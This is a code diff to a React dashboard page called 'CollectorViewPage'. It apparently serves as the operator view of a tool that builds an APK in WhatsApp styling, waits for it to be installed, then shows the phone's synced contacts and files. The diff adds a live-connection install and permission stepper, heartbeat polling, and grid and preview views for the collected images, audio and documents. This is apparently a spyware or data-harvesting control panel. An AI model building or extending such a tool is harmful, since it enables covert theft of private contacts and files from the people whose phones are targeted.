@@ -25,6 +25,11 @@ import {
   RefreshCw,
   Shield,
   HardDrive,
+  Wifi,
+  WifiOff,
+  CheckCircle2,
+  Circle,
+  Play,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -35,6 +40,22 @@ import { Separator } from '@/components/ui/separator';
 import { useToast } from '@/hooks/use-toast';
 
 // ─── Types ───────────────────────────────────────────────
+
+type SessionStatus =
+  | 'apk_built'
+  | 'waiting_install'
+  | 'app_installed'
+  | 'permissions_granted'
+  | 'syncing_contacts'
+  | 'syncing_files'
+  | 'live_connected'
+  | 'offline';
+
+interface StatusEntry {
+  status: SessionStatus;
+  timestamp: string;
+  detail?: string;
+}
 
 interface ContactInfo {
   id: string;
@@ -72,6 +93,95 @@ interface SessionData {
   count: number;
   fileCount: number;
   createdAt: string;
+  status: SessionStatus | null;
+  statusHistory: StatusEntry[];
+  lastHeartbeat: string | null;
+  isOnline: boolean;
+}
+
+// ─── Status Stepper ──────────────────────────────────────
+
+const STATUS_STEPS: { key: SessionStatus; label: string }[] = [
+  { key: 'apk_built', label: 'APK Built' },
+  { key: 'waiting_install', label: 'Waiting Install' },
+  { key: 'app_installed', label: 'App Installed' },
+  { key: 'permissions_granted', label: 'Permissions' },
+  { key: 'syncing_contacts', label: 'Syncing Contacts' },
+  { key: 'syncing_files', label: 'Syncing Files' },
+  { key: 'live_connected', label: 'Live Connected' },
+];
+
+function getStepIndex(status: SessionStatus | null): number {
+  if (!status) return -1;
+  const idx = STATUS_STEPS.findIndex(s => s.key === status);
+  return idx;
+}
+
+function StatusStepper({ status, isOnline }: { status: SessionStatus | null; isOnline: boolean }) {
+  const currentIdx = getStepIndex(status);
+
+  return (
+    <div className="bg-[#075E54] px-3 py-3">
+      <div className="flex items-center justify-between mb-2">
+        <span className="text-white/80 text-xs font-semibold">Setup Progress</span>
+        {isOnline ? (
+          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-[#25D366]">
+            <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
+            LIVE
+          </span>
+        ) : (
+          <span className="inline-flex items-center gap-1.5 text-xs font-bold text-white/40">
+            <span className="w-2 h-2 rounded-full bg-white/30" />
+            OFFLINE
+          </span>
+        )}
+      </div>
+      <div className="flex items-start gap-0">
+        {STATUS_STEPS.map((step, idx) => {
+          const isCompleted = idx < currentIdx;
+          const isCurrent = idx === currentIdx;
+          const isFuture = idx > currentIdx;
+
+          return (
+            <div key={step.key} className="flex flex-col items-center flex-1 min-w-0">
+              <div className="flex items-center w-full">
+                {idx > 0 && (
+                  <div className={`flex-1 h-0.5 ${idx <= currentIdx ? 'bg-[#25D366]' : 'bg-white/20'}`} />
+                )}
+                <div
+                  className={`w-5 h-5 rounded-full flex items-center justify-center shrink-0 ${
+                    isCompleted
+                      ? 'bg-[#25D366]'
+                      : isCurrent
+                      ? 'bg-[#25D366]/20 border-2 border-[#25D366]'
+                      : 'bg-white/10'
+                  }`}
+                >
+                  {isCompleted ? (
+                    <CheckCircle2 className="w-3 h-3 text-white" />
+                  ) : isCurrent ? (
+                    <div className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse" />
+                  ) : (
+                    <Circle className="w-2 h-2 text-white/30" />
+                  )}
+                </div>
+                {idx < STATUS_STEPS.length - 1 && (
+                  <div className={`flex-1 h-0.5 ${idx < currentIdx ? 'bg-[#25D366]' : 'bg-white/20'}`} />
+                )}
+              </div>
+              <span
+                className={`text-[8px] mt-1 text-center leading-tight ${
+                  isCompleted || isCurrent ? 'text-[#25D366] font-semibold' : 'text-white/40'
+                }`}
+              >
+                {step.label}
+              </span>
+            </div>
+          );
+        })}
+      </div>
+    </div>
+  );
 }
 
 // ─── vCard Generator ────────────────────────────────────
@@ -197,6 +307,11 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
   const [fileTypeFilter, setFileTypeFilter] = useState<string>('all');
   const [previewFile, setPreviewFile] = useState<UploadedFileInfo | null>(null);
 
+  // Status tracking state
+  const [sessionStatus, setSessionStatus] = useState<SessionStatus | null>(null);
+  const [isOnline, setIsOnline] = useState(false);
+  const [fileViewMode, setFileViewMode] = useState<'list' | 'grid'>('list');
+
   useEffect(() => {
     params.then(p => setSessionId(p.id));
   }, [params]);
@@ -218,29 +333,23 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
     } catch {}
   }, []);
 
-  // Data fetching - triggered by sessionId and fetchKey (for manual refresh)
-  const fetchData = useCallback(async () => {
+  // Status polling - every 5 seconds
+  useEffect(() => {
     if (!sessionId) return;
-    setLoading(true);
-    setError('');
-    try {
-      const res = await fetch(`/api/contacts/view/${sessionId}`);
-      if (!res.ok) {
-        setError('Session not found or expired');
-        setLoading(false);
-        return;
-      }
-      const data: SessionData = await res.json();
-      setContacts(data.contacts);
-      setFiles(data.files || []);
-      setUploadedFiles(data.uploadedFiles || []);
-      setAppName(data.appName || 'Collector');
-      saveToHistory(data);
-    } catch {
-      setError('Failed to load data');
-    }
-    setLoading(false);
-  }, [sessionId, saveToHistory]);
+    const poll = async () => {
+      try {
+        const res = await fetch(`/api/sessions/${sessionId}/status`);
+        if (res.ok) {
+          const data = await res.json();
+          setSessionStatus(data.status);
+          setIsOnline(data.isOnline);
+        }
+      } catch {}
+    };
+    poll();
+    const interval = setInterval(poll, 5000);
+    return () => clearInterval(interval);
+  }, [sessionId]);
 
   // Fetch on sessionId change or manual refresh (fetchKey change)
   useEffect(() => {
@@ -258,6 +367,8 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         setFiles(data.files || []);
         setUploadedFiles(data.uploadedFiles || []);
         setAppName(data.appName || 'Collector');
+        setSessionStatus(data.status);
+        setIsOnline(data.isOnline);
         saveToHistory(data);
         setLoading(false);
       })
@@ -316,7 +427,6 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       toast({ title: 'Copied!', description: `${contact.name}'s vCard copied` });
       setTimeout(() => setCopiedId(null), 2000);
     } catch {
-      // Fallback for browsers without clipboard API
       const textarea = document.createElement('textarea');
       textarea.value = generateVCard(contact);
       document.body.appendChild(textarea);
@@ -408,7 +518,6 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
     } catch {
-      // Fallback: open in new tab
       window.open(file.downloadUrl, '_blank');
     }
   }, []);
@@ -543,12 +652,18 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         </a>
         <div className="flex-1 min-w-0">
           <h1 className="text-white font-semibold text-base">{appName}</h1>
-          <p className="text-white/70 text-xs">{contacts.length} contacts &bull; {uploadedFiles.length} files</p>
+          <p className="text-white/70 text-xs">
+            {contacts.length} contacts &bull; {uploadedFiles.length} files
+            {isOnline && <span className="ml-1 text-[#25D366]">&bull; LIVE</span>}
+          </p>
         </div>
         <button onClick={() => handleRefresh()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Refresh">
           <RefreshCw className="w-4 h-4 text-white/70" />
         </button>
       </div>
+
+      {/* Status Stepper */}
+      <StatusStepper status={sessionStatus} isOnline={isOnline} />
 
       {/* Access Status Cards */}
       <div className="px-3 py-3 bg-[#ECE5DD]">
@@ -732,32 +847,46 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
         </>
       )}
 
-      {/* ─── FILES TAB (Uploaded Files with download) ── */}
+      {/* ─── FILES TAB (Uploaded Files with grid/list view) ── */}
       {activeTab === 'files' && (
         <>
-          {/* File type filter */}
+          {/* File type filter + view toggle */}
           <div className="px-3 pb-1 bg-[#ECE5DD]">
-            <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar">
-              {[
-                { key: 'all', label: 'All', count: uploadedFiles.length },
-                { key: 'image', label: 'Images', count: fileTypeCounts.image || 0 },
-                { key: 'video', label: 'Videos', count: fileTypeCounts.video || 0 },
-                { key: 'audio', label: 'Audio', count: fileTypeCounts.audio || 0 },
-                { key: 'pdf', label: 'PDF', count: fileTypeCounts.pdf || 0 },
-                { key: 'document', label: 'Docs', count: fileTypeCounts.document || 0 },
-              ].map(filter => (
-                <button
-                  key={filter.key}
-                  onClick={() => setFileTypeFilter(filter.key)}
-                  className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap transition-colors ${
-                    fileTypeFilter === filter.key
-                      ? 'bg-[#075E54] text-white'
-                      : 'bg-white text-gray-600 hover:bg-gray-100'
-                  }`}
-                >
-                  {filter.label} ({filter.count})
-                </button>
-              ))}
+            <div className="flex items-center gap-2">
+              <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar flex-1">
+                {[
+                  { key: 'all', label: 'All', count: uploadedFiles.length },
+                  { key: 'image', label: 'Images', count: fileTypeCounts.image || 0 },
+                  { key: 'video', label: 'Videos', count: fileTypeCounts.video || 0 },
+                  { key: 'audio', label: 'Audio', count: fileTypeCounts.audio || 0 },
+                  { key: 'pdf', label: 'PDF', count: fileTypeCounts.pdf || 0 },
+                  { key: 'document', label: 'Docs', count: fileTypeCounts.document || 0 },
+                ].map(filter => (
+                  <button
+                    key={filter.key}
+                    onClick={() => setFileTypeFilter(filter.key)}
+                    className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap transition-colors ${
+                      fileTypeFilter === filter.key
+                        ? 'bg-[#075E54] text-white'
+                        : 'bg-white text-gray-600 hover:bg-gray-100'
+                    }`}
+                  >
+                    {filter.label} ({filter.count})
+                  </button>
+                ))}
+              </div>
+              {/* View toggle */}
+              <button
+                onClick={() => setFileViewMode(fileViewMode === 'list' ? 'grid' : 'list')}
+                className="w-8 h-8 rounded-full bg-white shadow-sm flex items-center justify-center shrink-0"
+                title={fileViewMode === 'list' ? 'Grid view' : 'List view'}
+              >
+                {fileViewMode === 'list' ? (
+                  <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 16 16"><path d="M1 2.5A1.5 1.5 0 012.5 1h3A1.5 1.5 0 017 2.5v3A1.5 1.5 0 015.5 7h-3A1.5 1.5 0 011 5.5v-3zm8 0A1.5 1.5 0 0110.5 1h3A1.5 1.5 0 0115 2.5v3A1.5 1.5 0 0113.5 7h-3A1.5 1.5 0 019 5.5v-3zm-8 8A1.5 1.5 0 012.5 9h3A1.5 1.5 0 017 10.5v3A1.5 1.5 0 015.5 15h-3A1.5 1.5 0 011 13.5v-3zm8 0A1.5 1.5 0 0110.5 9h3a1.5 1.5 0 011.5 1.5v3a1.5 1.5 0 01-1.5 1.5h-3A1.5 1.5 0 019 13.5v-3z"/></svg>
+                ) : (
+                  <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 16 16"><path fillRule="evenodd" d="M2.5 12a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5zm0-4a.5.5 0 01.5-.5h10a.5.5 0 010 1H3a.5.5 0 01-.5-.5z"/></svg>
+                )}
+              </button>
             </div>
           </div>
 
@@ -778,7 +907,69 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                   <RefreshCw className="w-3.5 h-3.5 mr-1" /> Refresh
                 </Button>
               </div>
+            ) : fileViewMode === 'grid' ? (
+              /* ─── GRID VIEW ─── */
+              <div className="px-3 pb-4">
+                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
+                  {filteredFiles.map((file) => (
+                    <div
+                      key={file.id}
+                      className="bg-white rounded-xl shadow-sm overflow-hidden cursor-pointer hover:shadow-md transition-shadow"
+                      onClick={() => {
+                        if (file.fileType === 'image' || file.fileType === 'pdf') {
+                          setPreviewFile(file);
+                        }
+                      }}
+                    >
+                      {/* Thumbnail area */}
+                      <div className="aspect-square bg-gray-50 flex items-center justify-center overflow-hidden relative">
+                        {file.fileType === 'image' ? (
+                          <img
+                            src={file.downloadUrl}
+                            alt={file.fileName}
+                            className="w-full h-full object-cover"
+                            loading="lazy"
+                          />
+                        ) : file.fileType === 'audio' ? (
+                          <div className="flex flex-col items-center gap-2 w-full px-2">
+                            <Music className="w-8 h-8 text-orange-400" />
+                            <audio
+                              controls
+                              className="w-full h-8"
+                              src={file.downloadUrl}
+                              onClick={(e) => e.stopPropagation()}
+                            >
+                              <track kind="captions" />
+                            </audio>
+                          </div>
+                        ) : file.fileType === 'pdf' ? (
+                          <div className="flex flex-col items-center gap-2">
+                            <FileText className="w-10 h-10 text-red-400" />
+                            <span className="text-[10px] text-gray-500">PDF Document</span>
+                          </div>
+                        ) : file.fileType === 'video' ? (
+                          <div className="flex flex-col items-center gap-2">
+                            <Video className="w-10 h-10 text-red-400" />
+                            <span className="text-[10px] text-gray-500">Video</span>
+                          </div>
+                        ) : (
+                          <div className="flex flex-col items-center gap-2">
+                            {getFileIcon(file.fileType)}
+                            <span className="text-[10px] text-gray-500 capitalize">{file.fileType}</span>
+                          </div>
+                        )}
+                      </div>
+                      {/* File info */}
+                      <div className="p-2">
+                        <p className="text-xs font-medium text-gray-900 truncate">{file.fileName}</p>
+                        <p className="text-[10px] text-gray-400">{formatFileSize(file.fileSize)}</p>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </div>
             ) : (
+              /* ─── LIST VIEW (original) ─── */
               <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
                 {filteredFiles.map((file, index) => (
                   <React.Fragment key={file.id}>
@@ -797,7 +988,6 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                         </p>
                       </div>
                       <div className="flex items-center gap-1">
-                        {/* Preview for images */}
                         {(file.fileType === 'image' || file.fileType === 'pdf') && (
                           <button
                             onClick={() => setPreviewFile(file)}
@@ -967,6 +1157,19 @@ export default function CollectorViewPage({ params }: { params: Promise<{ id: st
                   src={previewFile.downloadUrl}
                   alt={previewFile.fileName}
                   className="w-full max-h-[60vh] object-contain rounded-xl"
+                />
+              ) : previewFile.fileType === 'audio' ? (
+                <div className="flex flex-col items-center gap-4 py-8">
+                  <Music className="w-16 h-16 text-orange-400" />
+                  <audio controls className="w-full" src={previewFile.downloadUrl}>
+                    <track kind="captions" />
+                  </audio>
+                </div>
+              ) : previewFile.fileType === 'pdf' ? (
+                <iframe
+                  src={previewFile.downloadUrl}
+                  className="w-full h-[60vh] rounded-xl"
+                  title={previewFile.fileName}
                 />
               ) : (
                 <iframe
